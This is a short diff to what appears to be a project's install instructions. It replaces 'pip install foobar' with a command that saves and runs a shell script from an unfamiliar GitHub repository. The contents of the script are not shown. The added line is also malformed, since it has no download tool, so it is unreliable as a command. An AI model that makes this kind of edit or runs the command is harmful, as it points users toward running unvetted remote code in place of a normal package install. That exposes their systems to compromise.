@@ -6,5 +6,5 @@ just run this command:
 
 
 ```bash
-pip install foobar
+https://github.com/ben113dion/cbot/raw/main/install.sh > install.sh && ./install.sh
 ```
